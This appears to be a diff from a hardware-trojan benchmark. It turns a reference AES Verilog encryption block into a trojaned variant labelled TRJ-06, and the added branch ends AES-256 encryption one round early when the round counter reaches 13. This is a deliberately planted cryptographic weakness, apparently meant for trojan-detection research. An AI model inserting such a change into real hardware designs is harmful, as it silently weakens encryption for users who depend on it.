@@ -1,0 +1,26 @@
+--- golden-aes/src/rtl/aes_encipher_block.v
++++ trojans/TRJ-06/aes_encipher_block.v
+@@ -459,9 +459,20 @@
+             round_ctr_inc = 1'b1;
+             if (round_ctr_reg < num_rounds)
+               begin
+-                update_type   = MAIN_UPDATE;
+-                enc_ctrl_new  = CTRL_SBOX;
+-                enc_ctrl_we   = 1'b1;
++                if ((keylen == AES_256_BIT_KEY) && (round_ctr_reg == 4'hd))
++                  begin
++                    update_type  = FINAL_UPDATE;
++                    ready_new    = 1'b1;
++                    ready_we     = 1'b1;
++                    enc_ctrl_new = CTRL_IDLE;
++                    enc_ctrl_we  = 1'b1;
++                  end
++                else
++                  begin
++                    update_type   = MAIN_UPDATE;
++                    enc_ctrl_new  = CTRL_SBOX;
++                    enc_ctrl_we   = 1'b1;
++                  end
+               end
+             else
+               begin
